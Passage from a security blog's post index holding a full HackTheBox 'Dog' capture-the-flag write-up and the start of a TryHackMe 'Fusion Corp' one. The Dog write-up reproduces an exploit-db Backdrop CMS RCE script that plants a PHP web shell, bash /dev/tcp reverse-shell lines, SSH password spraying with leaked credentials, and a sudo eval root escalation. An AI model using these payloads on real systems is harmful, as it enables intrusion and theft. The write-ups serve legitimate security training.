[{"content":"Overview Dog is an easy box from HackTheBox that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.\nTarget IP 10.10.11.58 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract settings.php → DB Creds [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Login as CMS User [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Upload Malicious Module (RCE) [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Trigger Web Shell (www-data) [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Password Spray SSH Users [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as johncusack [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Run `sudo bee` to Eval PHP [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Gain Root Access 1. Reconnaissance (TA0043) 1.1. Network Scanning (T1595) As always, we start with an nmap scan to see what services are running on the target. 0xblivion@fluffy: ~ root@0xblivion:~# sudo nmap -sVC -oA nmap/dog 10.10.11.58 -vv # Nmap 7.95 scan initiated Wed Jul 2 16:25:44 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/dog -vv 10.10.11.58 Nmap scan report for 10.10.11.58 Host is up, received echo-reply ttl 63 (0.055s latency). Scanned at 2025-07-02 16:25:44 EDT for 9s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8= | 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y= | 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-git: | 10.10.11.58:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: todo: customize url aliases. reference:https://docs.backdro... |_http-generator: Backdrop CMS 1 (https://backdropcms.org) |_http-title: Home | Dog | http-robots.txt: 22 disallowed entries | /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register | /user/password /user/login /user/logout /?q=admin /?q=comment/reply | /?q=filter/tips /?q=node/add /?q=search /?q=user/password |_/?q=user/register /?q=user/login /?q=user/logout |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 2 16:25:53 2025 -- 1 IP address (1 host up) scanned in 9.54 seconds copy From the Nmap output, we see an open SSH port (22/tcp) and an HTTP server (80/tcp) running Apache. The HTTP server reveals a .git/ directory, which is a big deal, and also identifies the web application as Backdrop CMS.\n2. Initial Access (TA0001) 2.1. Web Enumeration and Git Exposure (T1590) We\u0026rsquo;ll run gobuster in the background to discover more directories and files on the web server. 0xblivion@fluffy: ~ root@0xblivion:~# gobuster dir -u http://10.10.11.58/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.58/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /modules (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/modules/] /.php (Status: 403) [Size: 276] /.html (Status: 403) [Size: 276] /themes (Status: 301) [Size: 311] [--\u003e http://10.10.11.58/themes/] /.htm (Status: 403) [Size: 276] /files (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/files/] /sites (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/sites/] /core (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/core/] /.htaccess (Status: 403) [Size: 276] /.phtml (Status: 403) [Size: 276] /layouts (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/layouts/] /.htc (Status: 403) [Size: 276] /.html_var_DE (Status: 403) [Size: 276] /server-status (Status: 403) [Size: 276] /.htpasswd (Status: 403) [Size: 276] /.git (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/.git/] /.html. (Status: 403) [Size: 276] /.html.html (Status: 403) [Size: 276] /.htpasswds (Status: 403) [Size: 276] /.htm. (Status: 403) [Size: 276] /.htmll (Status: 403) [Size: 276] /.phps (Status: 403) [Size: 276] /.html.old (Status: 403) [Size: 276] /.ht (Status: 403) [Size: 276] /.html.bak (Status: 403) [Size: 276] /.htm.htm (Status: 403) [Size: 276] /.hta (Status: 403) [Size: 276] /.htgroup (Status: 403) [Size: 276] /.html1 (Status: 403) [Size: 276] /.html.LCK (Status: 403) [Size: 276] /.html.printable (Status: 403) [Size: 276] /.htm.LCK (Status: 403) [Size: 276] /.htaccess.bak (Status: 403) [Size: 276] /.html.php (Status: 403) [Size: 276] /.htmls (Status: 403) [Size: 276] /.htx (Status: 403) [Size: 276] /.htlm (Status: 403) [Size: 276] /.htm2 (Status: 403) [Size: 276] /.html- (Status: 403) [Size: 276] /.htuser (Status: 403) [Size: 276] /.htacess (Status: 403) [Size: 276] /.htm.d (Status: 403) [Size: 276] /.htm.html (Status: 403) [Size: 276] /.htm.old (Status: 403) [Size: 276] /.html-1 (Status: 403) [Size: 276] /.html.orig (Status: 403) [Size: 276] /.html.sav (Status: 403) [Size: 276] /.html_ (Status: 403) [Size: 276] /.html_files (Status: 403) [Size: 276] /.htmlpar (Status: 403) [Size: 276] /.htmlprint (Status: 403) [Size: 276] /.hts (Status: 403) [Size: 276] Progress: 63088 / 63089 (100.00%) =============================================================== Finished =============================================================== copy The gobuster scan confirms the presence of the .git directory, which was also found by Nmap. Since Backdrop CMS is open-source, we\u0026rsquo;ll focus on the .git directory for potential information disclosure.\nWe\u0026rsquo;ll use git-dumper to extract the contents of the .git repository from the web server.\n0xblivion@fluffy: ~ root@0xblivion:~# mkdir git-dump; git-dumper http://10.10.11.58/ git-dump/ [~] Testing http://10.10.11.58/.git/HEAD [200] [~] Testing http://10.10.11.58/.git/ [200] [~] Fetching .git recursively [~] Fetching http://10.10.11.58/.gitignore [404] [~] http://10.10.11.58/.gitignore responded with status code 404 [~] Fetching http://10.10.11.58/.git/ [200] [~] Fetching http://10.10.11.58/.git/objects/ [200] [~] Fetching http://10.10.11.58/.git/HEAD [200] [~] Fetching http://10.10.11.58/.git/COMMIT_EDITMSG [200] [~] Fetching http://10.10.11.58/.git/config [200] [~] Fetching http://10.10.11.58/.git/branches/ [200] [~] Fetching http://10.10.11.58/.git/hooks/ [200] [~] Fetching http://10.10.11.58/.git/description [200] [~] Fetching http://10.10.11.58/.git/logs/ [200] [~] Fetching http://10.10.11.58/.git/refs/ [200] ...SNIP.. copy 2.2. Credential Discovery from Git (T1555) Within the dumped .git repository, I found a settings.php file in the root directory that contains database credentials. 0xblivion@fluffy: ~ root@0xblivion:~# head -n 16 settings.php \u0026lt;?php /** * @file * Main Backdrop CMS configuration file. */ /** * Database configuration: * * Most sites can configure their database by entering the connection string * below. If using primary/replica databases or multiple connections, see the * advanced database documentation at * https://api.backdropcms.org/database-configuration */ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'; $database_prefix = ''; copy The credentials found are root:BackDropJ2024DS2024.\nI tried to log in to the website\u0026rsquo;s admin panel using these credentials, but root was not a valid username.\n2.3. Finding a Valid User I used grep to recursively search for strings containing dog.htb within the dumped Git repository, hoping to find valid usernames.\n0xblivion@fluffy: ~ root@0xblivion:~# grep -Ri dog.htb files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \"tiffany@dog.htb\" .git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases .git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases copy We found a potential username: tiffany@dog.htb.\n0xblivion@fluffy: ~ root@0xblivion:~# echo \"10.10.11.58 dog.htb\" | sudo tee -a /etc/hosts copy Using tiffany as the username and BackDropJ2024DS2024 as the password, I was able to log into the Backdrop CMS admin panel.\n2.4. Authenticated RCE in Backdrop CMS (T1190) Now that we have authenticated access to the Backdrop CMS admin panel, we\u0026rsquo;ll look for a way to gain a shell. I searched for exploits related to \u0026ldquo;Backdrop CMS\u0026rdquo; and found an authenticated RCE exploit on exploit-db.\nhttps://www.exploit-db.com/exploits/52021 The exploit script generates a malicious module (shell.zip) that can be uploaded to the CMS.\n#!/usr/bin/env python3 # Exploit Title: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) # Date: 04/27/2024 # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: https://backdropcms.org/ # Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip # Version: latest # Tested on: MacOS import os import time import zipfile def create_files(): info_content = \u0026#34;\u0026#34;\u0026#34; type = module name = Block description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page. package = Layouts tags[] = Blocks tags[] = Site Architecture version = BACKDROP_VERSION backdrop = 1.x configure = admin/structure/block ; Added by Backdrop CMS packaging script on 2024-03-07 project = backdrop version = 1.27.1 timestamp = 1709862662 \u0026#34;\u0026#34;\u0026#34; shell_info_path = \u0026#34;shell/shell.info\u0026#34; os.makedirs(os.path.dirname(shell_info_path), exist_ok=True) # Klasörüoluşturur with open(shell_info_path, \u0026#34;w\u0026#34;) as file: file.write(info_content) shell_content = \u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;\u0026lt;?php echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; autofocus id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php if(isset($_GET[\u0026#39;cmd\u0026#39;])) { system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; shell_php_path = \u0026#34;shell/shell.php\u0026#34; with open(shell_php_path, \u0026#34;w\u0026#34;) as file: file.write(shell_content) return shell_info_path, shell_php_path def create_zip(info_path, php_path): zip_filename = \u0026#34;shell.zip\u0026#34; with zipfile.ZipFile(zip_filename, \u0026#39;w\u0026#39;) as zipf: zipf.write(info_path, arcname=\u0026#39;shell/shell.info\u0026#39;) zipf.write(php_path, arcname=\u0026#39;shell/shell.php\u0026#39;) return zip_filename def main(url): print(\u0026#34;Backdrop CMS 1.27.1 - Remote Command Execution Exploit\u0026#34;) time.sleep(3) print(\u0026#34;Evil module generating...\u0026#34;) time.sleep(2) info_path, php_path = create_files() zip_filename = create_zip(info_path, php_path) print(\u0026#34;Evil module generated!\u0026#34;, zip_filename) time.sleep(2) print(\u0026#34;Go to \u0026#34; + url + \u0026#34;/admin/modules/install and upload the \u0026#34; + zip_filename + \u0026#34; for Manual Installation.\u0026#34;) time.sleep(2) print(\u0026#34;Your shell address:\u0026#34;, url + \u0026#34;/modules/shell/shell.php\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: import sys if len(sys.argv) \u0026lt; 2: print(\u0026#34;Usage: python script.py [url]\u0026#34;) else: main(sys.argv[1]) Running the Python script: 0xblivion@fluffy: ~ root@0xblivion:~# ./exploit.py http://10.10.11.58/ Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... Evil module generated! shell.zip Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation. Your shell address: http://10.10.11.58//modules/shell/shell.php copy The script instructs us to upload shell.zip via the \u0026ldquo;Manual Installation\u0026rdquo; option in the CMS admin panel (http://dog.htb/admin/modules/install).\nFunctionality \u0026gt; Install new modules \u0026gt; Manual Installation\nHowever, the CMS only accepts .tar.gz files for manual installation. We need to compress the shell/ directory generated by the script into a .tar.gz archive.\n0xblivion@fluffy: ~ root@0xblivion:~# tar -czf shell.tar.gz shell/ root@0xblivion:~# ls shell shell.tar.gz shell.zip exploit.py git-dump copy Now, we can upload shell.tar.gz through the \u0026ldquo;Manual installation\u0026rdquo; page.\nAfter successful installation, I can access my web shell at http://dog.htb/modules/shell/shell.php.\nThe web shell confirms we are running as the www-data user. We\u0026rsquo;ll use a reverse shell to get a more stable connection.\nbash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;YOUR IP\u0026gt;/\u0026lt;PORT\u0026gt; 0\u0026gt;\u0026amp;1\u0026#39; On our attacking machine, we set up a netcat listener: 0xblivion@fluffy: ~ root@0xblivion:~# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.15.7] from (UNKNOWN) [10.10.11.58] 54688 bash: cannot set terminal process group (929): Inappropriate ioctl for device bash: no job control in this shell www-data@dog:/var/www/html/modules/shell$ copy We upgrade the shell to an interactive TTY: 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ script -q /dev/null -c bash copy Then, CTRL+Z to background the shell, followed by stty raw -echo; fg and pressing Enter twice. 0xblivion@fluffy: ~ stty raw -echo; fg [2] - continued nc -lnvp 9001 www-data@dog:/var/www/html/modules/shell$ copy We also adjust the TTY dimensions for better usability:\n0xblivion@fluffy: ~ root@0xblivion:~# stty -a speed 38400 baud; rows 45; columns 238; line = 0; intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = ; eol2 = ; swtch = ; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc copy 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ stty rows 45 cols 238 copy Actually, you don\u0026rsquo;t need to do this step since you can just find a user through the webshell. 3. Privilege Escalation (TA0004) 3.1. User Enumeration and Lateral Movement via SSH (T1021.004) Now that we have a stable shell, we enumerate local users on the system. 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash jobert:x:1000:1000:jobert:/home/jobert:/bin/bash johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash copy We found three users with shell access: root, jobert, and johncusack. We\u0026rsquo;ll save these usernames to users.txt.\nI used netexec to spray the database password (BackDropJ2024DS2024) against these users for SSH: 0xblivion@fluffy: ~ root@0xblivion:~# nxc ssh 10.10.11.58 -u users.txt -p 'BackDropJ2024DS2024' --continue-on-success SSH 10.10.11.58 22 10.10.11.58 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12 SSH 10.10.11.58 22 10.10.11.58 [-] jobert:BackDropJ2024DS2024 SSH 10.10.11.58 22 10.10.11.58 [+] johncusack:BackDropJ2024DS2024 Linux - Shell access! copy The johncusack user\u0026rsquo;s password is BackDropJ2024DS2024. I can now SSH into the box as johncusack.\n0xblivion@fluffy: ~ root@0xblivion:~# ssh johncusack@dog.htb The authenticity of host 'dog.htb (10.10.11.58)' can't be established. ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'dog.htb' (ED25519) to the list of known hosts. johncusack@dog.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Wed 02 Jul 2025 09:26:21 PM UTC System load: 0.0 Usage of /: 50.9% of 6.32GB Memory usage: 26% Swap usage: 0% Processes: 244 Users logged in: 0 IPv4 address for eth0: 10.10.11.58 IPv6 address for eth0: dead:beef::250:56ff:feb0:b9d2 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Mar 4 17:04:29 2025 from 10.10.15.7 johncusack@dog:~$ copy We are now logged in as johncusack. We can find the user flag in the home directory. 0xblivion@fluffy: ~ johncusack@dog:~$ ls user.txt johncusack@dog:~$ cat user.txt d305454bc5a53fb01aec080ec3a2ee33 copy User flag: d305454bc5a53fb01aec080ec3a2ee33 3.2. Sudo Abuse for Root (T1548.003) I check sudo -l to see what commands johncusack can run with sudo privileges.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo -l [sudo] password for johncusack: Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee copy The user johncusack can execute /usr/local/bin/bee as root. I inspect the bee file.\n0xblivion@fluffy: ~ johncusack@dog:~$ file /usr/local/bin/bee /usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php copy It\u0026rsquo;s a symbolic link to /backdrop_tool/bee/bee.php. We can view the contents of bee.php:\n#!/usr/bin/env php \u0026lt;?php /** * @file * A command line utility for Backdrop CMS. */ // Exit gracefully with a meaningful message if installed within a web // accessible location and accessed in the browser. if (!bee_is_cli()) { echo bee_browser_load_html(); die(); } // Set custom error handler. set_error_handler(\u0026#39;bee_error_handler\u0026#39;); // Include files. require_once __DIR__ . \u0026#39;/includes/miscellaneous.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/command.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/render.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/filesystem.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/input.inc\u0026#39;; require_once __DIR__ . \u0026#39;/includes/globals.inc\u0026#39;; // Main execution code. bee_initialize_server(); bee_parse_input(); bee_initialize_console(); bee_process_command(); bee_print_messages(); bee_display_output(); exit(); /** * Custom error handler for `bee`. * * @param int $error_level * The level of the error. * @param string $message * Error message to output to the user. * @param string $filename * The file that the error came from. * @param int $line * The line number the error came from. * @param array $context * An array of all variables from where the error was triggered. * * @see https://www.php.net/manual/en/function.set-error-handler.php * @see _backdrop_error_handler() */ function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) { require_once __DIR__ . \u0026#39;/includes/errors.inc\u0026#39;; _bee_error_handler_real($error_level, $message, $filename, $line, $context); } /** * Detects whether the current script is running in a command-line environment. */ function bee_is_cli() { return (empty($_SERVER[\u0026#39;SERVER_SOFTWARE\u0026#39;]) \u0026amp;\u0026amp; (php_sapi_name() == \u0026#39;cli\u0026#39; || (is_numeric($_SERVER[\u0026#39;argc\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;argc\u0026#39;] \u0026gt; 0))); } /** * Return the HTML to display if this page is loaded in the browser. * * @return string * The concatentated html to display. */ function bee_browser_load_html() { // Set the title to use in h1 and title elements. $title = \u0026#34;Bee Gone!\u0026#34;; // Place a white block over \u0026#34;#!/usr/bin/env php\u0026#34; as this is output before // anything else. $browser_output = \u0026#34;\u0026lt;div style=\u0026#39;background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;\u0026#39;\u0026gt;\u0026amp;nbsp;\u0026lt;/div\u0026gt;\u0026#34;; // Add the bee logo and style appropriately. $browser_output .= \u0026#34;\u0026lt;img src=\u0026#39;./images/bee.png\u0026#39; align=\u0026#39;right\u0026#39; width=\u0026#39;150\u0026#39; height=\u0026#39;157\u0026#39; style=\u0026#39;max-width:100%;margin-top:3rem;\u0026#39;\u0026gt;\u0026#34;; // Add meaningful text. $browser_output .= \u0026#34;\u0026lt;h1 style=\u0026#39;font-family:Tahoma;\u0026#39;\u0026gt;$title\u0026lt;/h1\u0026gt;\u0026#34;; $browser_output .= \u0026#34;\u0026lt;p style=\u0026#39;font-family:Verdana;\u0026#39;\u0026gt;Bee is a command line tool only and will not work in the browser.\u0026lt;/p\u0026gt;\u0026#34;; // Add the document title using javascript when the window loads. $browser_output .= \u0026#34;\u0026lt;script\u0026gt;window.onload = function(){document.title=\u0026#39;$title\u0026#39;;}\u0026lt;/script\u0026gt;\u0026#34;; // Output the combined string. return $browser_output; } I check the bee command\u0026rsquo;s eval functionality:\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo bee help eval eval, ev, php-eval Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop. Arguments: code The PHP code to evaluate. Examples: bee eval '$node = node_load(1); print $node-\u003etitle;' Loads node with nid 1 and then prints its title. bee eval \"node_access_rebuild();\" Rebuild node access permissions. bee eval \"file_unmanaged_copy('$HOME/Pictures/image.jpg', 'public://image.jpg');\" Copies a file whose path is determined by an environment's variable. Note the use of double quotes so the variable $HOME gets replaced by its value. copy The bee command has an eval subcommand that allows us to execute arbitrary PHP code. To use it correctly, I need to specify the --root parameter pointing to the web root (/var/www/html). I can use this to spawn a root shell.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \"system('/bin/bash -i');\" root@dog:/var/www/html# copy Or, if you need a reverse shell back to your machine (replace \u0026lt;ATTACKER_IP\u0026gt; and \u0026lt;PORT\u0026gt;): 0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \\ \"system('bash -i \u003e\u0026 /dev/tcp/\u0026lt;IP\u0026gt;/\u0026lt;PORT\u0026gt; 0\u003e\u00261');\" copy Get the root.txt 0xblivion@fluffy: ~ root@dog:/var/www/html# id uid=0(root) gid=0(root) groups=0(root) root@dog:/var/www/html# cat /root/root.txt 83970a2d7e6797bf5f32b7a915dad3f7 copy Root flag: 83970a2d7e6797bf5f32b7a915dad3f7 ","permalink":"https://0xblivion.dev/posts/htb/linux/easy/hackthebox---dog-writeup/","summary":"\u003ch1 id=\"overview\"\u003eOverview\u003c/h1\u003e\n\u003cimg src=\"/img/dog/Dog.png\" alt=\"\" class=\"img-responsive\" loading=\"lazy\" /\u003e\n\u003cp\u003e\u003ccode\u003eDog\u003c/code\u003e is an easy box from \u003ca href=\"https://app.hackthebox.com/\"\u003eHackTheBox\u003c/a\u003e that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed \u003ccode\u003e.git\u003c/code\u003e directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as \u003ccode\u003ewww-data\u003c/code\u003e. For privilege escalation, we discover that a user (\u003ccode\u003ejohncusack\u003c/code\u003e) can execute a PHP utility (\u003ccode\u003ebee\u003c/code\u003e) as root, which we then abuse to spawn a root shell.\u003c/p\u003e","title":"HackTheBox - Dog Writeup"},{"content":"Overview Fusion corp is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, lparker, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.\nFrom there, post-exploitation enumeration reveals another user, jmurphy, with their password stored in the user account\u0026rsquo;s comment field. This user is a member of the Backup Operators group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the ntds.dit and SYSTEM hives. Finally, we use secretsdump.py to dump all the domain hashes, get the administrator\u0026rsquo;s hash, and use it to get the final flag.\nTarget IP 10.10.114.232 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Check Web (Static Page) [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Fuzz Directories → Found /backup/ [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access /backup/ → Found employees.ods [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract Usernames from employees.ods [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]AS-REP Roasting (lparker) → Crack Hash with Hashcat [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as lparker via Evil-WinRM [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Enumerate Users (net user) → Find jmurphy [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Extract jmurphy's password from comment field [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as jmurphy via Evil-WinRM [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Abuse Backup Operators (Volume Shadow Copy) [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Create Shadow Copy (DiskShadow) [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Copy ntds.dit, SYSTEM.SAV, SAM.SAV [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Setup SMB server to Exfiltrate Files [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Dump Domain Hashes → Get Administrator Hash [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Login as Administrator via Evil-WinRM 1. Reconnaissance (TA0043) 1.1. Network Scanning (T1595) As always, we kick things off with an nmap scan to see what we’re up against. 0xblivion@fusionCorp: ~ root@localhost:~# sudo nmap -sVC -oA nmap/fusioncorp 10.10.114.232 -vv # Nmap 7.95 scan initiated Thu Jul 10 16:24:00 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/fusioncorp -vv 10.10.114.232 Nmap scan report for 10.10.114.232 Host is up, received echo-reply ttl 125 (0.15s latency). Scanned at 2025-07-10 16:24:01 EDT for 69s Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34 |_http-server-header: Microsoft-IIS/10.0 |_http-title: eBusiness Bootstrap Template | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-10 20:24:17Z) 135/tcp open msrpc 